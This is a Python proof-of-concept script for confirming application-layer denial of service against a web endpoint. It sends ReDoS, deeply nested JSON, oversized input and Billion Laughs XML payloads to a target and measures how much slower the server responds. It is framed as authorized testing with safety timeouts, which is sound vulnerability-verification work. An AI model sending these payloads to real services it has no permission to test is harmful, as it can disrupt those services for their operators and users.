#!/usr/bin/env python3
"""
PoC: Denial of Service via Resource Exhaustion - VULN-DOS-001

Vulnerability:
    Application-layer Denial of Service occurs when crafted input causes the
    server to consume disproportionate resources (CPU, memory, I/O). Common
    vectors include ReDoS (Regular Expression Denial of Service), deeply nested
    JSON parsing, XML entity expansion, hash collision attacks, and algorithmic
    complexity attacks. Unlike volumetric DoS, these attacks require only a
    single or few requests.

Test methodology:
    1. Measure baseline response time with a normal request.
    2. Send a crafted payload designed to trigger resource exhaustion.
    3. Compare the response time to baseline.
    4. If response time exceeds 10x baseline, the vulnerability is confirmed.
    5. A strict safety timeout prevents actually taking down the test environment.

Usage:
    python poc_dos_001.py --target http://localhost:8080 \\
        --endpoint "/api/search" --param "query" \\
        --payload-type regex

Exit codes:
    0 = CONFIRMED  (significant response time amplification detected)
    1 = NOT_REPRODUCED  (no significant amplification)
    2 = ERROR  (script encountered an error)

AUTHORIZED SECURITY TESTING ONLY.
"""

import argparse
import json
import sys
import time

try:
    import requests
    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


# ---------------------------------------------------------------------------
# Payload generators
# ---------------------------------------------------------------------------

def generate_regex_bomb():
    """
    Generate a ReDoS payload.
    Pattern targets common vulnerable regex like (a+)+, (a|a)+, etc.
    """
    # Classic ReDoS string: many 'a's followed by a character that forces backtracking
    return "a" * 50 + "!"


def generate_nested_json(depth=200):
    """Generate deeply nested JSON that stresses recursive parsers."""
    payload = {"data": "leaf"}
    for _ in range(depth):
        payload = {"nested": payload}
    return json.dumps(payload)


def generate_large_json_array(size=100000):
    """Generate a large JSON array with repeated keys to stress hash tables."""
    items = [{"key": f"item_{i}", "value": "x" * 100} for i in range(min(size, 100000))]
    return json.dumps({"items": items})


def generate_long_string(length=1000000):
    """Generate an extremely long string parameter."""
    return "A" * min(length, 1000000)


def generate_xml_bomb():
    """
    Generate an XML entity expansion payload (Billion Laughs).
    Limited to a safe depth to avoid harming the test environment.
    """
    return """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<root>&lol5;</root>"""


PAYLOAD_GENERATORS = {
    "regex": ("ReDoS (Regular Expression Denial of Service)", generate_regex_bomb),
    "nested_json": ("Deeply nested JSON", generate_nested_json),
    "large_json": ("Large JSON array (hash collision stress)", generate_large_json_array),
    "long_string": ("Extremely long string parameter", generate_long_string),
    "xml_bomb": ("XML entity expansion (Billion Laughs)", generate_xml_bomb),
}


# ---------------------------------------------------------------------------
# Arguments
# ---------------------------------------------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(
        description="PoC for Denial of Service via Resource Exhaustion (VULN-DOS-001)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="AUTHORIZED SECURITY TESTING ONLY.",
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8080",
        help="Base URL of the target application (default: http://localhost:8080)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Request timeout in seconds (default: 30)",
    )
    parser.add_argument(
        "--endpoint",
        default="/api/search",
        help="Target endpoint to test (default: /api/search)",
    )
    parser.add_argument(
        "--param",
        default="query",
        help="Parameter name to inject payload into (default: query)",
    )
    parser.add_argument(
        "--method",
        choices=["get", "post"],
        default="post",
        help="HTTP method (default: post)",
    )
    parser.add_argument(
        "--payload-type",
        choices=list(PAYLOAD_GENERATORS.keys()) + ["all"],
        default="all",
        help="Type of DoS payload to send (default: all)",
    )
    parser.add_argument(
        "--threshold",
        type=float,
        default=10.0,
        help="Response time multiplier threshold for confirmation (default: 10.0)",
    )
    parser.add_argument(
        "--safety-timeout",
        type=int,
        default=60,
        help="Absolute safety timeout per request in seconds (default: 60)",
    )
    parser.add_argument(
        "--baseline-runs",
        type=int,
        default=3,
        help="Number of baseline measurement runs (default: 3)",
    )
    parser.add_argument(
        "--content-type",
        default=None,
        help="Override Content-Type header (auto-detected if not set)",
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Core logic
# ---------------------------------------------------------------------------

def send_request(target, endpoint, method, param, payload, content_type, timeout):
    """Send a request with the given payload and return (response, elapsed_seconds)."""
    url = f"{target.rstrip('/')}{endpoint}"
    headers = {"User-Agent": "VulnAnalysis-PoC/1.0"}

    start = time.monotonic()

    try:
        if method == "get":
            resp = requests.get(
                url,
                params={param: payload},
                headers=headers,
                timeout=timeout,
                allow_redirects=False,
            )
        else:
            # Determine content type
            ct = content_type
            if ct is None:
                # Auto-detect: if payload looks like JSON or XML, use appropriate type
                stripped = payload.strip() if isinstance(payload, str) else ""
                if stripped.startswith("{") or stripped.startswith("["):
                    ct = "application/json"
                elif stripped.startswith("<?xml") or stripped.startswith("<!DOCTYPE"):
                    ct = "application/xml"
                else:
                    ct = "application/x-www-form-urlencoded"

            headers["Content-Type"] = ct

            if ct == "application/x-www-form-urlencoded":
                resp = requests.post(
                    url,
                    data={param: payload},
                    headers=headers,
                    timeout=timeout,
                    allow_redirects=False,
                )
            elif ct == "application/json":
                # If payload is already JSON string, send as body; otherwise wrap it
                if isinstance(payload, str) and (
                    payload.strip().startswith("{") or payload.strip().startswith("[")
                ):
                    resp = requests.post(
                        url,
                        data=payload,
                        headers=headers,
                        timeout=timeout,
                        allow_redirects=False,
                    )
                else:
                    resp = requests.post(
                        url,
                        json={param: payload},
                        headers=headers,
                        timeout=timeout,
                        allow_redirects=False,
                    )
            else:
                resp = requests.post(
                    url,
                    data=payload,
                    headers=headers,
                    timeout=timeout,
                    allow_redirects=False,
                )

        elapsed = time.monotonic() - start
        return resp, elapsed

    except requests.Timeout:
        elapsed = time.monotonic() - start
        return None, elapsed
    except requests.RequestException as exc:
        elapsed = time.monotonic() - start
        raise


def measure_baseline(target, endpoint, method, param, timeout, runs):
    """Measure baseline response time with a benign request."""
    benign_payload = "test"
    times = []

    for i in range(runs):
        try:
            resp, elapsed = send_request(
                target, endpoint, method, param, benign_payload, None, timeout
            )
            if resp is not None:
                times.append(elapsed)
                print(f"    Run {i+1}: {elapsed:.3f}s (HTTP {resp.status_code})")
            else:
                print(f"    Run {i+1}: timed out")
        except requests.ConnectionError:
            raise
        except requests.RequestException as exc:
            print(f"    Run {i+1}: error - {exc}")

    if not times:
        return None

    avg = sum(times) / len(times)
    return avg


def test_payload(target, endpoint, method, param, payload_name, payload,
                 content_type, baseline_time, threshold, safety_timeout):
    """
    Test a single DoS payload against the target.

    Returns:
        tuple: (confirmed: bool, detail: str, elapsed: float)
    """
    effective_timeout = min(safety_timeout, max(int(baseline_time * threshold * 2), 10))

    print(f"\n    Sending {payload_name} payload...")
    print(f"    Payload size: {len(payload) if isinstance(payload, str) else 'N/A'} chars")
    print(f"    Safety timeout: {effective_timeout}s")

    try:
        resp, elapsed = send_request(
            target, endpoint, method, param, payload,
            content_type, effective_timeout
        )
    except requests.ConnectionError as exc:
        return False, f"Connection failed: {exc}", 0.0
    except requests.RequestException as exc:
        return False, f"Request error: {exc}", 0.0

    # Timed out = server was stalled (potential confirmation)
    if resp is None:
        ratio = elapsed / baseline_time if baseline_time > 0 else float("inf")
        print(f"    Request timed out after {elapsed:.3f}s (ratio: {ratio:.1f}x)")
        if ratio >= threshold:
            return True, (
                f"Request timed out at {elapsed:.3f}s "
                f"({ratio:.1f}x baseline of {baseline_time:.3f}s)"
            ), elapsed
        return False, f"Timed out but ratio {ratio:.1f}x below threshold", elapsed

    ratio = elapsed / baseline_time if baseline_time > 0 else 0
    print(f"    Response: HTTP {resp.status_code} in {elapsed:.3f}s (ratio: {ratio:.1f}x baseline)")

    if ratio >= threshold:
        return True, (
            f"Response took {elapsed:.3f}s "
            f"({ratio:.1f}x baseline of {baseline_time:.3f}s)"
        ), elapsed

    # Check for server error (may indicate resource exhaustion)
    if resp.status_code in (500, 502, 503, 504):
        print(f"    Server returned {resp.status_code} (possible resource exhaustion)")
        if ratio >= threshold / 2:
            return True, (
                f"Server error {resp.status_code} with {ratio:.1f}x slowdown "
                f"suggests resource exhaustion"
            ), elapsed

    return False, f"Response time ratio {ratio:.1f}x is below {threshold}x threshold", elapsed


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    args = parse_args()
    vuln_id = "VULN-DOS-001"

    if not _HAS_REQUESTS:
        print("[ERROR] VULN-DOS-001: 'requests' library is required. "
              "Install with: pip install requests")
        sys.exit(2)

    print("=" * 70)
    print("  PoC: Denial of Service via Resource Exhaustion")
    print(f"  Vulnerability ID: {vuln_id}")
    print("=" * 70)
    print(f"  Target:          {args.target}")
    print(f"  Endpoint:        {args.endpoint}")
    print(f"  Method:          {args.method.upper()}")
    print(f"  Parameter:       {args.param}")
    print(f"  Payload type:    {args.payload_type}")
    print(f"  Threshold:       {args.threshold}x baseline")
    print(f"  Safety timeout:  {args.safety_timeout}s")
    print(f"  Request timeout: {args.timeout}s")
    print("=" * 70)
    print()

    start_time = time.monotonic()

    # -------------------------------------------------------------------------
    # Step 1: Measure baseline
    # -------------------------------------------------------------------------
    print("[*] Step 1: Measuring baseline response time...")

    try:
        baseline = measure_baseline(
            args.target, args.endpoint, args.method, args.param,
            args.timeout, args.baseline_runs
        )
    except requests.ConnectionError as exc:
        print(f"\n[ERROR] {vuln_id}: Cannot connect to {args.target} - {exc}")
        sys.exit(2)

    if baseline is None:
        print(f"\n[ERROR] {vuln_id}: Could not establish baseline (all requests failed)")
        sys.exit(2)

    print(f"\n    Baseline average: {baseline:.3f}s")

    # Sanity check: if baseline is already very slow, warn
    if baseline > 10.0:
        print(f"    WARNING: Baseline is very slow ({baseline:.1f}s). Results may be unreliable.")

    # -------------------------------------------------------------------------
    # Step 2: Test payloads
    # -------------------------------------------------------------------------
    print(f"\n[*] Step 2: Testing DoS payloads...")

    if args.payload_type == "all":
        payload_types = list(PAYLOAD_GENERATORS.keys())
    else:
        payload_types = [args.payload_type]

    results = []
    any_confirmed = False

    for pt in payload_types:
        description, generator = PAYLOAD_GENERATORS[pt]
        print(f"\n  --- {description} ({pt}) ---")

        payload = generator()
        confirmed, detail, elapsed = test_payload(
            target=args.target,
            endpoint=args.endpoint,
            method=args.method,
            param=args.param,
            payload_name=description,
            payload=payload,
            content_type=args.content_type,
            baseline_time=baseline,
            threshold=args.threshold,
            safety_timeout=args.safety_timeout,
        )

        status = "CONFIRMED" if confirmed else "Not confirmed"
        print(f"    Result: {status} - {detail}")
        results.append((pt, description, confirmed, detail, elapsed))

        if confirmed:
            any_confirmed = True

    # -------------------------------------------------------------------------
    # Step 3: Summary
    # -------------------------------------------------------------------------
    total_elapsed = time.monotonic() - start_time

    print()
    print("-" * 70)
    print(f"  Baseline:  {baseline:.3f}s")
    print(f"  Threshold: {args.threshold}x")
    print()

    for pt, desc, confirmed, detail, elapsed in results:
        marker = ">>>" if confirmed else "   "
        status = "CONFIRMED" if confirmed else "safe"
        print(f"  {marker} [{status:>9}] {desc}: {detail}")

    print()

    if any_confirmed:
        confirmed_payloads = [desc for _, desc, c, _, _ in results if c]
        result_msg = (
            f"[CONFIRMED] {vuln_id}: DoS via resource exhaustion confirmed. "
            f"Effective payload(s): {', '.join(confirmed_payloads)}."
        )
        exit_code = 0
    else:
        result_msg = (
            f"[NOT_REPRODUCED] {vuln_id}: No payload caused response time "
            f"amplification above {args.threshold}x threshold."
        )
        exit_code = 1

    print(f"  Result:  {result_msg}")
    print(f"  Elapsed: {total_elapsed:.2f}s")
    print("-" * 70)

    sys.exit(exit_code)


if __name__ == "__main__":
    main()
